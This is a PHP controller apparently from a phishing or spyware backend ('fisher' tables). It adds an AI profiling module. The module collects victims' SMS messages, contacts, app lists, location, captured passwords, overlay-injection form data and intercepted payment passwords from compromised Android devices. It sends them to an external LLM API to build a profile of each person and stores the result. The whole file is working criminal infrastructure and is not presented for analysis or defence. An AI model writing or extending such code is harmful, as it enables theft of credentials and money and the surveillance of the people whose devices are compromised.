<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class AiController extends BaseController
{
    private const ANALYSIS_TASK_TIMEOUT = 360;

    /**
     * POST /api/ai/analyze
     * AI 智能人像分析
     */
    public function analyze()
    {
        set_time_limit(330); // 给 300 秒的 AI 请求预留状态收尾时间
        ignore_user_abort(true);
        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        $deviceId = $input['deviceId'] ?? '';
        $sources = $input['sources'] ?? ['db', 'sms', 'contacts', 'apps', 'accounts'];

        if (!$deviceId) {
            return json(['success' => false, 'message' => '缺少 deviceId']);
        }

        // 读取 AI 配置
        $configs = [];
        $rows = Db::table('fisher_ai_config')->select()->toArray();
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiUrl = $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1');
        $model = $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash');
        $apiKey = $configs['api_key'] ?? '';
        $temperature = floatval($configs['temperature'] ?? 0.1);
        $systemPrompt = $configs['system_prompt'] ?? '你是一个专业的数据分析师，请根据提供的数据进行人像画像分析。';

        if (!$apiKey) {
            return json(['success' => false, 'message' => 'AI API Key 未配置']);
        }

        // 收集设备数据
        $dataContent = $this->collectDeviceData($deviceId, $sources);

        if (!$dataContent) {
            return json(['success' => false, 'message' => '未找到该设备的数据']);
        }

        $taskState = [];
        if (!$this->claimAnalysisTask($deviceId, $sources, $taskState)) {
            return json([
                'success' => true,
                'message' => '该设备正在进行 AI 分析',
                'data' => [
                    'status' => 'running',
                    'analysis_status' => $this->publicAnalysisState($taskState),
                ],
            ]);
        }

        // 新一轮分析以新报告为准，开始后立即移除上一轮结果。
        try {
            Db::table('fisher_ai_reports')->where('device_id', $deviceId)->delete();
        } catch (\Throwable $e) {
            $message = '旧 AI 报告清理失败: ' . $e->getMessage();
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json(['success' => false, 'message' => $message]);
        }

        // 调用 DeepSeek API
        $userMessage = "以下是设备 {$deviceId} 的采集数据，请进行人像画像分析：\n\n" . $dataContent;

        $payload = [
            'model' => $model,
            'messages' => [
                ['role' => 'system', 'content' => $systemPrompt],
                ['role' => 'user', 'content' => $userMessage],
            ],
            'temperature' => $temperature,
            'max_tokens' => 8192,
        ];

        $ch = curl_init($apiUrl . '/chat/completions');
        if ($ch === false) {
            $message = 'AI 请求初始化失败';
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json(['success' => false, 'message' => $message]);
        }
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer ' . $apiKey,
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            $message = 'AI 请求失败: ' . $error;
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json(['success' => false, 'message' => $message]);
        }

        if ($httpCode !== 200) {
            $message = "AI 返回错误 (HTTP {$httpCode}): " . substr($response, 0, 500);
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json(['success' => false, 'message' => $message]);
        }

        $result = json_decode($response, true);
        $report = $this->extractAiReport($result);

        if (!$report) {
            $message = $this->describeEmptyAiResponse($result);
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json([
                'success' => false,
                'message' => $message,
                'response_keys' => is_array($result) ? array_keys($result) : [],
            ]);
        }

        // 删除旧报告，存入新报告
        try {
            Db::transaction(function () use ($deviceId, $report) {
                Db::table('fisher_ai_reports')->where('device_id', $deviceId)->delete();
                Db::table('fisher_ai_reports')->insert([
                    'device_id' => $deviceId,
                    'report' => $report,
                    'created_at' => date('Y-m-d H:i:s'),
                ]);
            });
        } catch (\Throwable $e) {
            $message = 'AI 报告保存失败: ' . $e->getMessage();
            $this->finishAnalysisTask($deviceId, 'failed', $message);
            return json(['success' => false, 'message' => $message]);
        }

        $completedState = $this->finishAnalysisTask($deviceId, 'completed');

        return json(['success' => true, 'data' => [
            'report' => $report,
            'status' => 'completed',
            'analysis_status' => $this->publicAnalysisState($completedState),
        ]]);
    }

    /**
     * GET /api/ai/device-data/:deviceId
     * 获取 AI 数据缓存状态
     */
    public function getDeviceData($deviceId = '')
    {
        if (!$deviceId) $deviceId = Request::get('deviceId', '');
        $rows = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->select()->toArray();
        $data = [];
        foreach ($rows as $r) {
            $data[$r['data_type']] = [
                'count' => (int)$r['data_count'],
                'updated_at' => $r['updated_at'],
            ];
        }
        $analysisState = $this->readAnalysisState($deviceId);
        // 分析进行中不返回上一轮报告，避免前端把旧结果误认为新结果。
        $report = null;
        if ($analysisState['status'] !== 'running') {
            $report = Db::table('fisher_ai_reports')->where('device_id', $deviceId)->order('id', 'desc')->find();
        }

        return json([
            'success' => true,
            'data' => $data,
            'report' => $report ? $report['report'] : null,
            'report_time' => $report ? $report['created_at'] : null,
            'analysis_status' => $this->publicAnalysisState($analysisState),
        ]);
    }

    /**
     * DELETE /api/ai/report/:deviceId
     * 永久清除设备 AI 报告和已完成状态。
     */
    public function deleteReport($deviceId = '')
    {
        $deviceId = trim((string)$deviceId);
        if ($deviceId === '') {
            return json(['success' => false, 'message' => '缺少 deviceId'], 400);
        }

        $state = $this->readAnalysisState($deviceId);
        if ($state['status'] === 'running') {
            return json(['success' => false, 'message' => 'AI 分析进行中，请等待完成后再清除'], 409);
        }

        try {
            Db::table('fisher_ai_reports')->where('device_id', $deviceId)->delete();
            $state = $this->resetAnalysisState($deviceId);
        } catch (\Throwable $e) {
            return json(['success' => false, 'message' => 'AI 报告清除失败: ' . $e->getMessage()], 500);
        }

        return json([
            'success' => true,
            'message' => 'AI 报告已清除',
            'analysis_status' => $this->publicAnalysisState($state),
        ]);
    }

    /**
     * POST /api/ai/device-data
     * 前端存入设备数据到 AI 缓存表
     */
    public function saveDeviceData()
    {
        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        $deviceId = $input['deviceId'] ?? '';
        $dataType = $input['dataType'] ?? '';
        $dataJson = $input['data'] ?? [];

        if (!$deviceId || !$dataType) {
            return json(['success' => false, 'message' => '缺少参数']);
        }

        $jsonStr = is_string($dataJson) ? $dataJson : json_encode($dataJson, JSON_UNESCAPED_UNICODE);
        $count = is_array($dataJson) ? count($dataJson) : 0;

        Db::table('fisher_ai_device_data')->replace(true)->insert([
            'device_id' => $deviceId,
            'data_type' => $dataType,
            'data_json' => $jsonStr,
            'data_count' => $count,
            'updated_at' => date('Y-m-d H:i:s'),
        ]);

        return json(['success' => true, 'data' => ['count' => $count]]);
    }

    /**
     * 收集设备数据用于 AI 分析（优先从 fisher_ai_device_data 缓存表读取）
     */
    private function collectDeviceData($deviceId, $sources)
    {
        $sections = [];

        // 设备基本信息
        if (in_array('accounts', $sources) || in_array('db', $sources)) {
            $device = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
            if ($device) {
                $sections[] = "【设备信息】\n" .
                    "品牌: " . ($device['brand'] ?? '') . "\n" .
                    "型号: " . ($device['model'] ?? '') . "\n" .
                    "系统: Android " . ($device['os_version'] ?? '') . "\n" .
                    "IP: " . ($device['public_ip'] ?? '') . "\n" .
                    "地理位置: " . ($device['geo_location'] ?? '') . "\n" .
                    "网络类型: " . ($device['network_type'] ?? '') . "\n" .
                    "电量: " . ($device['battery_level'] ?? '') . "%\n" .
                    "应用名称: " . ($device['app_name'] ?? '') . "\n" .
                    "首次连接: " . date('Y-m-d H:i:s', $device['first_seen'] ?? 0) . "\n";
            }
        }

        // 短信记录 — 优先从 AI 缓存表读取
        if (in_array('sms', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'sms')->find();
            if ($cached && !empty($cached['data_json'])) {
                $smsList = json_decode($cached['data_json'], true) ?: [];
                $smsText = "【短信记录】(共" . count($smsList) . "条)\n";
                foreach (array_slice($smsList, 0, 80) as $sms) {
                    $time = $sms['date'] ?? $sms['time'] ?? '';
                    $addr = $sms['address'] ?? $sms['sender'] ?? $sms['from'] ?? '';
                    $body = $sms['body'] ?? $sms['content'] ?? $sms['message'] ?? '';
                    $smsText .= "[{$time}] {$addr}: {$body}\n";
                }
                $sections[] = $smsText;
            }
        }

        // 通讯录 — 从 AI 缓存表读取
        if (in_array('contacts', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'contacts')->find();
            if ($cached && !empty($cached['data_json'])) {
                $contacts = json_decode($cached['data_json'], true) ?: [];
                $contactText = "【通讯录】(共" . count($contacts) . "人)\n";
                foreach (array_slice($contacts, 0, 100) as $c) {
                    $name = $c['name'] ?? $c['displayName'] ?? '';
                    $phone = $c['phone'] ?? $c['number'] ?? $c['phoneNumber'] ?? '';
                    $contactText .= "{$name} - {$phone}\n";
                }
                $sections[] = $contactText;
            }
        }

        // 应用列表 — 从 AI 缓存表读取
        if (in_array('apps', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'apps')->find();
            if ($cached && !empty($cached['data_json'])) {
                $apps = json_decode($cached['data_json'], true) ?: [];
                $appText = "【已安装应用】(共" . count($apps) . "个)\n";
                $appNames = [];
                foreach (array_slice($apps, 0, 80) as $app) {
                    $name = is_array($app) ? ($app['appName'] ?? $app['name'] ?? $app['packageName'] ?? '') : $app;
                    if ($name) $appNames[] = $name;
                }
                $appText .= implode(', ', $appNames) . "\n";
                $sections[] = $appText;
            }
        }

        // 数据库记录（操作日志、密码、注入数据）
        if (in_array('db', $sources)) {
            // 密码记录
            $passwords = Db::table('fisher_passwords')
                ->where('device_id', $deviceId)
                ->order('id', 'desc')
                ->limit(10)
                ->select()->toArray();
            if ($passwords) {
                $pwdText = "【密码记录】\n";
                foreach ($passwords as $p) {
                    $pwdText .= "类型: " . ($p['cipher_type'] ?? '') . " | 值: " . ($p['cipher_text'] ?? '') . " | 来源: " . ($p['source'] ?? '') . "\n";
                }
                $sections[] = $pwdText;
            }

            // 注入数据
            $injections = Db::table('fisher_injection_data')
                ->where('device_id', $deviceId)
                ->order('id', 'desc')
                ->limit(20)
                ->select()->toArray();
            if ($injections) {
                $injText = "【注入捕获数据】\n";
                foreach ($injections as $inj) {
                    $injText .= "模板: " . ($inj['template_name'] ?? '') . " | 包名: " . ($inj['package_name'] ?? '') . " | 数据: " . ($inj['form_data'] ?? '') . "\n";
                }
                $sections[] = $injText;
            }

            // 操作日志（最近20条）
            $logs = Db::table('fisher_operation_logs')
                ->where('device_id', $deviceId)
                ->order('id', 'desc')
                ->limit(20)
                ->select()->toArray();
            if ($logs) {
                $logText = "【操作日志】(最近20条)\n";
                foreach ($logs as $log) {
                    $logText .= "[" . ($log['log_type'] ?? '') . "] " . ($log['content'] ?? '') . "\n";
                }
                $sections[] = $logText;
            }

            // 支付密码记录
            try {
                $ciphers = Db::table('fisher_payment_cipher_records')
                    ->where('device_id', $deviceId)
                    ->order('id', 'desc')
                    ->limit(10)
                    ->select()->toArray();
                if ($ciphers) {
                    $cipherText = "【支付密码截获】\n";
                    foreach ($ciphers as $c) {
                        $cipherText .= "应用: " . ($c['app_name'] ?? $c['package_name'] ?? '') . " | 类型: " . ($c['cipher_type'] ?? '') . " | 密码: " . ($c['cipher_text'] ?? '') . "\n";
                    }
                    $sections[] = $cipherText;
                }
            } catch (\Exception $e) {}
        }

        return implode("\n", $sections);
    }

    /**
     * GET /api/ai/config
     * 获取 AI 配置
     */
    public function getConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅 admin 账号可查看 AI 配置'], 403);
        }

        $rows = Db::table('fisher_ai_config')->select()->toArray();
        $configs = [];
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiKey = $configs['api_key'] ?? '';
        $data = [
            'api_url' => $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1'),
            'model' => $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash'),
            'temperature' => $configs['temperature'] ?? '0.1',
            'system_prompt' => $configs['system_prompt'] ?? '你是一个专业的数据分析师，请根据提供的数据进行人像画像分析。',
            'api_key_configured' => $apiKey !== '',
            'api_key_masked' => $this->maskApiKey($apiKey),
        ];

        return json(['success' => true, 'data' => $data]);
    }

    /**
     * PUT /api/ai/config
     * 更新 AI 配置
     */
    public function updateConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅 admin 账号可修改 AI 配置'], 403);
        }

        $raw = file_get_contents('php://input');
        $data = $raw ? json_decode($raw, true) : [];

        if (!is_array($data)) {
            return json(['success' => false, 'message' => '配置格式错误'], 400);
        }

        if (isset($data['api_url'])) {
            $data['api_url'] = rtrim(trim((string)$data['api_url']), '/');
            if (!preg_match('#^https?://#i', $data['api_url'])) {
                return json(['success' => false, 'message' => 'API URL 必须以 http:// 或 https:// 开头'], 400);
            }
        }
        if (isset($data['model']) && trim((string)$data['model']) === '') {
            return json(['success' => false, 'message' => '模型名称不能为空'], 400);
        }
        if (isset($data['temperature'])) {
            if (!is_numeric($data['temperature']) || (float)$data['temperature'] < 0 || (float)$data['temperature'] > 2) {
                return json(['success' => false, 'message' => 'Temperature 必须在 0 到 2 之间'], 400);
            }
            $data['temperature'] = (string)(float)$data['temperature'];
        }

        $allowedKeys = ['api_url', 'model', 'api_key', 'temperature', 'system_prompt'];
        $updated = 0;

        foreach ($data as $key => $value) {
            if (in_array($key, $allowedKeys) && $value !== null) {
                // 空 Key 表示保留数据库中已经保存的 Key。
                if ($key === 'api_key' && trim((string)$value) === '') {
                    continue;
                }

                $value = trim((string)$value);
                $exists = Db::table('fisher_ai_config')->where('config_key', $key)->find();
                if ($exists) {
                    Db::table('fisher_ai_config')->where('config_key', $key)->update([
                        'config_value' => $value,
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                } else {
                    Db::table('fisher_ai_config')->insert([
                        'config_key' => $key,
                        'config_value' => $value,
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                }
                $updated++;
            }
        }

        return json(['success' => true, 'message' => "已更新 {$updated} 项配置"]);
    }

    /**
     * POST /api/ai/config/test
     * 使用已保存配置或页面当前输入测试 AI 接口。
     */
    public function testConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅 admin 账号可测试 AI 配置'], 403);
        }

        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        if (!is_array($input)) {
            $input = [];
        }

        $configs = [];
        $rows = Db::table('fisher_ai_config')->select()->toArray();
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiUrl = rtrim(trim((string)($input['api_url'] ?? $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1'))), '/');
        $model = trim((string)($input['model'] ?? $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash')));
        $inputKey = trim((string)($input['api_key'] ?? ''));
        $apiKey = $inputKey !== '' ? $inputKey : ($configs['api_key'] ?? '');
        $temperature = (float)($input['temperature'] ?? $configs['temperature'] ?? 0.1);

        if (!preg_match('#^https?://#i', $apiUrl)) {
            return json(['success' => false, 'message' => 'API URL 格式错误'], 400);
        }
        if ($model === '') {
            return json(['success' => false, 'message' => '模型名称为空'], 400);
        }
        if ($apiKey === '') {
            return json(['success' => false, 'message' => 'AI API Key 未配置'], 400);
        }

        $payload = [
            'model' => $model,
            'messages' => [
                ['role' => 'user', 'content' => 'Reply with OK.'],
            ],
            'temperature' => $temperature,
            'max_tokens' => 8,
        ];

        $ch = curl_init($apiUrl . '/chat/completions');
        if ($ch === false) {
            return json(['success' => false, 'message' => 'AI 请求初始化失败'], 500);
        }
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer ' . $apiKey,
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return json(['success' => false, 'message' => '连接失败: ' . $error], 502);
        }
        if ($httpCode !== 200) {
            $body = json_decode((string)$response, true);
            $message = $body['error']['message'] ?? $body['message'] ?? ('HTTP ' . $httpCode);
            return json(['success' => false, 'message' => 'AI 接口测试失败: ' . $message], 502);
        }

        return json(['success' => true, 'message' => "连接成功，模型 {$model} 可用"]);
    }

    private function analysisStateDirectory(): string
    {
        $runtime = function_exists('runtime_path')
            ? runtime_path()
            : dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'runtime';
        return rtrim($runtime, '/\\') . DIRECTORY_SEPARATOR . 'ai_analysis';
    }

    private function extractAiReport($result): string
    {
        if (!is_array($result)) {
            return '';
        }

        $candidates = [
            $result['choices'][0]['message']['content'] ?? null,
            $result['choices'][0]['text'] ?? null,
            $result['output_text'] ?? null,
            $result['data']['choices'][0]['message']['content'] ?? null,
            $result['data']['choices'][0]['text'] ?? null,
            $result['data']['output_text'] ?? null,
        ];

        foreach ($candidates as $candidate) {
            $text = $this->normalizeAiText($candidate);
            if ($text !== '') {
                return $text;
            }
        }

        foreach ([$result['output'] ?? null, $result['data']['output'] ?? null] as $output) {
            if (!is_array($output)) {
                continue;
            }
            foreach ($output as $item) {
                if (!is_array($item)) {
                    continue;
                }
                $text = $this->normalizeAiText($item['content'] ?? $item['text'] ?? null);
                if ($text !== '') {
                    return $text;
                }
            }
        }

        return '';
    }

    private function normalizeAiText($value): string
    {
        if (is_string($value)) {
            return trim($value);
        }
        if (!is_array($value)) {
            return '';
        }

        $parts = [];
        foreach ($value as $item) {
            if (is_string($item)) {
                $text = trim($item);
            } elseif (is_array($item)) {
                $text = $this->normalizeAiText($item['text'] ?? $item['content'] ?? $item['value'] ?? null);
            } else {
                $text = '';
            }
            if ($text !== '') {
                $parts[] = $text;
            }
        }
        return trim(implode("\n", $parts));
    }

    private function describeEmptyAiResponse($result): string
    {
        if (!is_array($result)) {
            return 'AI 返回内容不是有效 JSON';
        }

        $providerError = $result['error']['message']
            ?? $result['data']['error']['message']
            ?? null;
        if (is_string($providerError) && trim($providerError) !== '') {
            return 'AI 返回错误: ' . trim($providerError);
        }

        $refusal = $result['choices'][0]['message']['refusal']
            ?? $result['data']['choices'][0]['message']['refusal']
            ?? null;
        if (is_string($refusal) && trim($refusal) !== '') {
            return 'AI 未生成报告: ' . trim($refusal);
        }

        $finishReason = $result['choices'][0]['finish_reason']
            ?? $result['data']['choices'][0]['finish_reason']
            ?? null;
        if (is_string($finishReason) && trim($finishReason) !== '') {
            return 'AI 未返回有效内容，结束原因: ' . trim($finishReason);
        }

        return 'AI 返回格式无法识别，顶层字段: ' . implode(', ', array_keys($result));
    }

    private function analysisStatePath(string $deviceId): string
    {
        return $this->analysisStateDirectory() . DIRECTORY_SEPARATOR . hash('sha256', $deviceId) . '.json';
    }

    private function defaultAnalysisState(): array
    {
        return [
            'status' => 'idle',
            'task_id' => null,
            'started_at' => null,
            'started_at_ts' => 0,
            'finished_at' => null,
            'updated_at' => null,
            'error' => null,
            'sources' => [],
        ];
    }

    private function normalizeAnalysisState($state): array
    {
        $normalized = $this->defaultAnalysisState();
        if (is_array($state)) {
            $normalized = array_merge($normalized, $state);
        }

        $allowed = ['idle', 'running', 'completed', 'failed', 'timeout'];
        if (!in_array($normalized['status'], $allowed, true)) {
            $normalized['status'] = 'idle';
        }

        $startedAt = (int)($normalized['started_at_ts'] ?? 0);
        if ($normalized['status'] === 'running'
            && $startedAt > 0
            && time() - $startedAt > self::ANALYSIS_TASK_TIMEOUT) {
            $normalized['status'] = 'timeout';
            $normalized['finished_at'] = date('Y-m-d H:i:s');
            $normalized['updated_at'] = $normalized['finished_at'];
            $normalized['error'] = 'AI 分析超过 6 分钟未完成';
        }

        return $normalized;
    }

    private function readAnalysisState(string $deviceId): array
    {
        $path = $this->analysisStatePath($deviceId);
        if (!is_file($path)) {
            return $this->defaultAnalysisState();
        }

        $handle = @fopen($path, 'rb');
        if (!$handle) {
            return $this->defaultAnalysisState();
        }

        try {
            flock($handle, LOCK_SH);
            $raw = stream_get_contents($handle);
            flock($handle, LOCK_UN);
        } finally {
            fclose($handle);
        }

        return $this->normalizeAnalysisState($raw ? json_decode($raw, true) : null);
    }

    private function claimAnalysisTask(string $deviceId, array $sources, array &$state): bool
    {
        $directory = $this->analysisStateDirectory();
        if (!is_dir($directory) && !@mkdir($directory, 0775, true) && !is_dir($directory)) {
            throw new \RuntimeException('无法创建 AI 分析状态目录');
        }

        $handle = @fopen($this->analysisStatePath($deviceId), 'c+');
        if (!$handle) {
            throw new \RuntimeException('无法创建 AI 分析状态文件');
        }

        try {
            if (!flock($handle, LOCK_EX)) {
                throw new \RuntimeException('无法锁定 AI 分析状态文件');
            }
            rewind($handle);
            $raw = stream_get_contents($handle);
            $current = $this->normalizeAnalysisState($raw ? json_decode($raw, true) : null);
            if ($current['status'] === 'running') {
                $state = $current;
                flock($handle, LOCK_UN);
                return false;
            }

            try {
                $taskId = bin2hex(random_bytes(8));
            } catch (\Throwable $e) {
                $taskId = str_replace('.', '', uniqid('', true));
            }

            $now = date('Y-m-d H:i:s');
            $state = [
                'status' => 'running',
                'task_id' => $taskId,
                'started_at' => $now,
                'started_at_ts' => time(),
                'finished_at' => null,
                'updated_at' => $now,
                'error' => null,
                'sources' => array_values(array_filter($sources, 'is_string')),
            ];
            $this->writeAnalysisStateToHandle($handle, $state);
            flock($handle, LOCK_UN);
            return true;
        } finally {
            fclose($handle);
        }
    }

    private function finishAnalysisTask(string $deviceId, string $status, ?string $error = null): array
    {
        $directory = $this->analysisStateDirectory();
        if (!is_dir($directory) && !@mkdir($directory, 0775, true) && !is_dir($directory)) {
            return $this->defaultAnalysisState();
        }

        $handle = @fopen($this->analysisStatePath($deviceId), 'c+');
        if (!$handle) {
            return $this->defaultAnalysisState();
        }

        try {
            flock($handle, LOCK_EX);
            rewind($handle);
            $raw = stream_get_contents($handle);
            $state = $this->normalizeAnalysisState($raw ? json_decode($raw, true) : null);
            $now = date('Y-m-d H:i:s');
            $state['status'] = $status;
            $state['finished_at'] = $now;
            $state['updated_at'] = $now;
            $state['error'] = $error;
            $this->writeAnalysisStateToHandle($handle, $state);
            flock($handle, LOCK_UN);
            return $state;
        } finally {
            fclose($handle);
        }
    }

    private function resetAnalysisState(string $deviceId): array
    {
        $directory = $this->analysisStateDirectory();
        if (!is_dir($directory) && !@mkdir($directory, 0775, true) && !is_dir($directory)) {
            throw new \RuntimeException('AI 分析状态目录创建失败');
        }

        $handle = @fopen($this->analysisStatePath($deviceId), 'c+');
        if (!$handle) {
            throw new \RuntimeException('AI 分析状态文件打开失败');
        }

        try {
            if (!flock($handle, LOCK_EX)) {
                throw new \RuntimeException('AI 分析状态文件锁定失败');
            }
            $state = $this->defaultAnalysisState();
            $state['updated_at'] = date('Y-m-d H:i:s');
            $this->writeAnalysisStateToHandle($handle, $state);
            flock($handle, LOCK_UN);
            return $state;
        } finally {
            fclose($handle);
        }
    }

    private function writeAnalysisStateToHandle($handle, array $state): void
    {
        $json = json_encode($state, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        if ($json === false) {
            throw new \RuntimeException('AI 分析状态序列化失败');
        }
        rewind($handle);
        ftruncate($handle, 0);
        if (fwrite($handle, $json) === false) {
            throw new \RuntimeException('AI 分析状态写入失败');
        }
        fflush($handle);
    }

    private function publicAnalysisState(array $state): array
    {
        $state = $this->normalizeAnalysisState($state);
        return [
            'status' => $state['status'],
            'task_id' => $state['task_id'],
            'started_at' => $state['started_at'],
            'finished_at' => $state['finished_at'],
            'updated_at' => $state['updated_at'],
            'error' => $state['error'],
        ];
    }

    private function isAdminAccount(): bool
    {
        $user = $this->request->user ?? null;
        return is_array($user) && ($user['username'] ?? '') === 'admin';
    }

    private function maskApiKey(string $apiKey): string
    {
        if ($apiKey === '') {
            return '';
        }
        if (strlen($apiKey) <= 10) {
            return str_repeat('*', strlen($apiKey));
        }
        return substr($apiKey, 0, 6) . '***' . substr($apiKey, -4);
    }
}
